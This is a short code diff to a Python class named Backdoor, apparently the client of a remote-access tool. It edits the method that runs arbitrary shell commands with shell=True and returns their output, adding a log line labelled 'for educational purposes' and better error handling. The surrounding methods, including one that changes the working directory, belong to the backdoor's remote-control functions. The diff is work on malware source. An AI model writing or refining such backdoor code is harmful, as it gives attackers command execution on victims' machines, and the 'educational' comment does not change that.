@@ -40,10 +40,12 @@ class Backdoor:
         return None
     def execute_system_command(self, command):
         try:
+            # Log the command being executed (for educational purposes)
+            print(f"[*] Executing: {' '.join(command) if isinstance(command, list) else command}")
             return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
         except subprocess.CalledProcessError as e:
-            return f"Command failed: {e.output.decode()}".encode()
-
+            error_output = e.output.decode() if e.output else "No output"
+            return f"Command failed: {error_output}".encode()
     def change_working_directory(self, path):
         try:
             os.chdir(path)
